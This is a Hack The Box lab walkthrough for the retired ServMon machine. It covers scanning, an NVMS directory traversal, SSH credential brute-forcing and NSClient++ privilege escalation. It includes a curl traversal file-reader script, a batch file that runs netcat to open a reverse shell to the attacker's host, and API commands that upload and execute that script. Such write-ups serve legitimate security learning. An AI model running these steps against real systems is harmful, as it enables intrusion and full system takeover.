---
layout: post
title: "ServMon: Hack The Box Walkthrough"
date: 2020-06-20 16:46:31 +0000
last_modified_at: 2020-06-20 16:46:31 +0000
category: Walkthrough
tags: ["Hack The Box", ServMon, retired, Windows, Easy]
comments: true
image:
  feature: servmon-htb-walkthrough.png
---

This post documents the complete walkthrough of ServMon, a retired vulnerable [VM][1] created by [dmw0ng][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post
{:.no_toc}

* TOC
{:toc}

## Background

ServMon is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let’s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.184 --rate=500

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-04-14 02:40:22 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 49665/tcp on 10.10.10.184
Discovered open port 135/tcp on 10.10.10.184
Discovered open port 49668/tcp on 10.10.10.184
Discovered open port 80/tcp on 10.10.10.184
Discovered open port 6063/tcp on 10.10.10.184
Discovered open port 7680/tcp on 10.10.10.184
Discovered open port 5666/tcp on 10.10.10.184
Discovered open port 139/tcp on 10.10.10.184
Discovered open port 5040/tcp on 10.10.10.184
Discovered open port 49666/tcp on 10.10.10.184
Discovered open port 49664/tcp on 10.10.10.184
Discovered open port 49667/tcp on 10.10.10.184
Discovered open port 21/tcp on 10.10.10.184
Discovered open port 445/tcp on 10.10.10.184
Discovered open port 49670/tcp on 10.10.10.184
Discovered open port 8443/tcp on 10.10.10.184
Discovered open port 6699/tcp on 10.10.10.184
Discovered open port 49669/tcp on 10.10.10.184
Discovered open port 22/tcp on 10.10.10.184
```

Sure looks like a Windows machine from the number of open high ports in the 49660-49700 range. Let's do one better with `nmap` scanning the discovered ports to establish their services. Note that I'm only scanning ports below 49660.

```
# nmap -n -v -Pn -p21,22,80,135,139,445,5040,5666,6063,6699,7680,8443 -A --reason 10.10.10.184 -oN nmap.txt
...
PORT     STATE SERVICE       REASON          VERSION
21/tcp   open  ftp           syn-ack ttl 127 Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_01-18-20  12:05PM       <DIR>          Users
| ftp-syst:
|_  SYST: Windows_NT
22/tcp   open  ssh           syn-ack ttl 127 OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey:
|   2048 b9:89:04:ae:b6:26:07:3f:61:89:75:cf:10:29:28:83 (RSA)
|   256 71:4e:6c:c0:d3:6e:57:4f:06:b8:95:3d:c7:75:57:53 (ECDSA)
|_  256 15:38:bd:75:06:71:67:7a:01:17:9c:5c:ed:4c:de:0e (ED25519)
80/tcp   open  http          syn-ack ttl 127
| fingerprint-strings:
|   NULL:
|     HTTP/1.1 408 Request Timeout
|     Content-type: text/html
|     Content-Length: 0
|     Connection: close
|_    AuthInfo:
|_http-favicon: Unknown favicon MD5: 3AEF8B29C4866F96A539730FAB53A88F
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html).
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds? syn-ack ttl 127
5040/tcp open  unknown       syn-ack ttl 127
5666/tcp open  tcpwrapped    syn-ack ttl 127
6063/tcp open  x11?          syn-ack ttl 127
6699/tcp open  napster?      syn-ack ttl 127
7680/tcp open  pando-pub?    syn-ack ttl 127
8443/tcp open  ssl/https-alt syn-ack ttl 127
| fingerprint-strings:
|   FourOhFourRequest, HTTPOptions, RTSPRequest:
|     HTTP/1.1 404
|     Content-Length: 18
|     Document not found
|   GetRequest:
|     HTTP/1.1 302
|     Content-Length: 0
|     Location: /index.html
|     /png, */*
|     avigation</span
|     <span class="icon-bar"></span>
|_    <span class
| http-methods:
|_  Supported Methods: GET
| http-title: NSClient++
|_Requested resource was /index.html
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2020-01-14T13:24:20
| Not valid after:  2021-01-13T13:24:20
| MD5:   1d03 0c40 5b7a 0f6d d8c8 78e3 cba7 38b4
|_SHA-1: 7083 bd82 b4b0 f9c0 cc9c 5019 2f9f 9291 4694 8334
|_ssl-date: TLS randomness does not represent time
```

There are some weird services going on here. But first, let's check out what's inside the anonymous FTP.

{% include image.html image_alt="d3f17dc0.png" image_src="/8109bc69-b023-4f06-9997-c6dd7da07f66/d3f17dc0.png" %}

Appears that we have two usernames: Nadine and Nathan. And there is a plaintext file in each of those names.

{% include image.html image_alt="179654b9.png" image_src="/8109bc69-b023-4f06-9997-c6dd7da07f66/179654b9.png" %}

{% include image.html image_alt="8f02f018.png" image_src="/8109bc69-b023-4f06-9997-c6dd7da07f66/8f02f018.png" %}

The note from Nadine.

<div class="filename"><span>Confidential.txt</span></div>

```
Nathan,

I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.

Regards

Nadine
```
And the note from Nathan.

<div class="filename"><span>Notes to do.txt</span></div>

```
1) Change the password for NVMS - Complete
2) Lock down the NSClient Access - Complete
3) Upload the passwords
4) Remove public access to NVMS
5) Place the secret files in SharePoint
```

There's mention of three services: NVMS, NSClient and SharePoint. Well, we know that the NVMS is behind `80/tcp` and NSClient is behind `8443/tcp`.

__NVMS__

{% include image.html image_alt="03af88f2.png" image_src="/8109bc69-b023-4f06-9997-c6dd7da07f66/03af88f2.png" %}

__NSClient__

{% include image.html image_alt="c9c94600.png" image_src="/8109bc69-b023-4f06-9997-c6dd7da07f66/c9c94600.png" %}

### NVMS 1000

I have no idea what NVMS is so I did a little sleuthing around. First up, notice in the `nmap` scan there's no server banner? Probably some kind of home-brewed web server. This tells me some common vulnerability like directory traversal may be on the cards. Next up, I also noticed that there are JavaScript files with Chinese in them.

{% include image.html image_alt="812ef50b.png" image_src="/8109bc69-b023-4f06-9997-c6dd7da07f66/812ef50b.png" %}

This is Simplified Chinese, so I'm probably looking at a Chinese software. I managed to get some URLs from the JavaScript files and visited them.

{% include image.html image_alt="2e5a01af.png" image_src="/8109bc69-b023-4f06-9997-c6dd7da07f66/2e5a01af.png" %}

Looks like some kind of CCTV management system! Other than this, I'm getting nowhere.

#### Directory Traversal

Let's see what `dotdotpwn` gives us.

```
# dotdotpwn -m http -h 10.10.10.184 -o windows
#################################################################################
#                                                                               #
#  CubilFelino                                                       Chatsubo   #
#  Security Research Lab              and            [(in)Security Dark] Labs   #
#  chr1x.sectester.net                             chatsubo-labs.blogspot.com   #
#                                                                               #
#                               pr0udly present:                                #
#                                                                               #
#  ________            __  ________            __  __________                   #
#  \______ \    ____ _/  |_\______ \    ____ _/  |_\______   \__  _  __ ____    #
#   |    |  \  /  _ \\   __\|    |  \  /  _ \\   __\|     ___/\ \/ \/ //    \   #
#   |    `   \(  <_> )|  |  |    `   \(  <_> )|  |  |    |     \     /|   |  \  #
#  /_______  / \____/ |__| /_______  / \____/ |__|  |____|      \/\_/ |___|  /  #
#          \/                      \/                                      \/   #
#                              - DotDotPwn v3.0.2 -                             #
#                         The Directory Traversal Fuzzer                        #
#                         http://dotdotpwn.sectester.net                        #
#                            dotdotpwn@sectester.net                            #
#                                                                               #
#                               by chr1x & nitr0us                              #
#################################################################################

[+] Report name: Reports/10.10.10.184_04-14-2020_06-56.txt

[========== TARGET INFORMATION ==========]
[+] Hostname: 10.10.10.184
[+] Setting Operating System type to "windows"
[+] Protocol: http
[+] Port: 80

[=========== TRAVERSAL ENGINE ===========]
[+] Creating Traversal patterns (mix of dots and slashes)
[+] Multiplying 6 times the traversal patterns (-d switch)
[+] Creating the Special Traversal patterns
[+] Translating (back)slashes in the filenames
[+] Adapting the filenames according to the OS type detected (windows)
[+] Including Special sufixes
[+] Traversal Engine DONE ! - Total traversal tests created: 16542

[=========== TESTING RESULTS ============]
[+] Ready to launch 3.33 traversals per second
[+] Press Enter to start the testing (You can stop it pressing Ctrl + C)

[*] HTTP Status: 404 | Testing Path: http://10.10.10.184:80/../boot.ini
[*] HTTP Status: 404 | Testing Path: http://10.10.10.184:80/../windows/win.ini
[*] HTTP Status: 404 | Testing Path: http://10.10.10.184:80/../windows/system32/drivers/etc/hosts
[*] HTTP Status: 404 | Testing Path: http://10.10.10.184:80/../../boot.ini
[*] HTTP Status: 404 | Testing Path: http://10.10.10.184:80/../../windows/win.ini
[*] HTTP Status: 404 | Testing Path: http://10.10.10.184:80/../../windows/system32/drivers/etc/hosts
[*] HTTP Status: 404 | Testing Path: http://10.10.10.184:80/../../../boot.ini

[*] Testing Path: http://10.10.10.184:80/../../../windows/win.ini <- VULNERABLE!
```

Gotcha! Three levels of traversal is all you need. With that in mind, I wrote a simple script to read files.

<div class="filename"><span>read.sh</span></div>

```
#!/bin/bash

HOST=10.10.10.184
TRAV=$(urlencode "../../../")
FILE=$1

curl -s \
     "http://${HOST}/${TRAV}${FILE}"

echo
```

{% include image.html image_alt="0be5d67b.png" image_src="/8109bc69-b023-4f06-9997-c6dd7da07f66/0be5d67b.png" %}

Let's see if we can read `Passwords.txt` from Nathan's Desktop.

{% include image.html image_alt="77e3c780.png" image_src="/8109bc69-b023-4f06-9997-c6dd7da07f66/77e3c780.png" %}

Awesome!

### Hail Hydra!

Now that we have a list of usernames and passwords, let's use them with `hydra` against SSH and see what we've got.

{% include image.html image_alt="a1cab4b0.png" image_src="/8109bc69-b023-4f06-9997-c6dd7da07f66/a1cab4b0.png" %}

Sweet.

## Low-Privilege Shell

Time to get ourselves a shell.

{% include image.html image_alt="be5feaf4.png" image_src="/8109bc69-b023-4f06-9997-c6dd7da07f66/be5feaf4.png" %}

The file `user.txt` is at Nadine's Desktop as expected.

{% include image.html image_alt="b788b30c.png" image_src="/8109bc69-b023-4f06-9997-c6dd7da07f66/b788b30c.png" %}

## Privilege Enumeration

Previously we have established the fact that NSClient++ Web Server was behind `8443/tcp`. According to EDB-ID [46802](https://www.exploit-db.com/exploits/46802), we can get the login password with the low-privilege shell that we got.

{% include image.html image_alt="62692328.png" image_src="/8109bc69-b023-4f06-9997-c6dd7da07f66/62692328.png" %}

So the password is `ew2x6SsGTxjRwXOT`. Look what happens when we try to log in.

{% include image.html image_alt="2587bf0d.png" image_src="/8109bc69-b023-4f06-9997-c6dd7da07f66/2587bf0d.png" %}

Recall Nathan's notes talking about locking down NSClient? This must be it. The configuration states that only `127.0.0.1` is allowed to access.

{% include image.html image_alt="997cec6a.png" image_src="/8109bc69-b023-4f06-9997-c6dd7da07f66/997cec6a.png" %}

Well, we can utilize SSH's local port forwarding to do just that. Log off the low-privilege shell and relogin like so.

```
# ssh -L8443:127.0.0.1:8443 nadine@10.10.10.184
```

Once that's done, revisit NSClient++ Web Server, this time replace `10.10.10.184` with `127.0.0.1`.

{% include image.html image_alt="ac861e8f.png" image_src="/8109bc69-b023-4f06-9997-c6dd7da07f66/ac861e8f.png" %}

Isn't that easy?

### NSClient++ 0.5.2.35 - Privilege Escalation

Frankly, I have no idea which version of NSClient++ is installed but let's try anyway. It appears that CheckExternalScripts and the Scheduler modules are already enabled when I got in.

I've already placed a copy of `nc.exe` in `C:\Temp` and renamed it as `cute.exe`, as well as a copy of `evil.bat` like so.

```
@echo off
\temp\cute.exe 10.10.16.125 1234 -e cmd.exe
```

Now we add a new section to the `/settings/external scripts/scripts` and set the key to `command` and the value to the path to `evil.bat`.

{% include image.html image_alt="14a6d24a.png" image_src="/8109bc69-b023-4f06-9997-c6dd7da07f66/14a6d24a.png" %}

Similarly, we need to add a new section to `/settings/scheduler/schedules/evil` and set the key to `command` and the value to our external script, `evil`.

{% include image.html image_alt="c2990793.png" image_src="/8109bc69-b023-4f06-9997-c6dd7da07f66/c2990793.png" %}

Optionally, you can set the `interval` key and put in a low value (in seconds). I've put in 10 seconds.

{% include image.html image_alt="15d312dc.png" image_src="/8109bc69-b023-4f06-9997-c6dd7da07f66/15d312dc.png" %}

Save the changes and all that's left is to wait for the reverse shell.

{% include image.html image_alt="5ea7dc7e.png" image_src="/8109bc69-b023-4f06-9997-c6dd7da07f66/5ea7dc7e.png" %}

Getting `root.txt` is trivial with a SYSTEM shell.

{% include image.html image_alt="8cbb959a.png" image_src="/8109bc69-b023-4f06-9997-c6dd7da07f66/8cbb959a.png" %}

:dancer:

## Afterthought

I later found out that I don't need the Scheduler module to run a reverse shell back. Use the [API](https://docs.nsclient.org/api/rest/) to add an external script.

```
# curl -k -u "admin:ew2x6SsGTxjRwXOT" -XPUT https://127.0.0.1:8443/api/v1/scripts/ext/scripts/evil.bat --data-binary @evil.bat
```

Similarly, use the API to execute it.

```
# curl -k -u "admin:ew2x6SsGTxjRwXOT" https://127.0.0.1:8443/api/v1/queries/evil/commands/execute
```

[1]: https://www.hackthebox.eu/home/machines/profile/235
[2]: https://www.hackthebox.eu/home/users/profile/158833
[3]: https://www.hackthebox.eu/
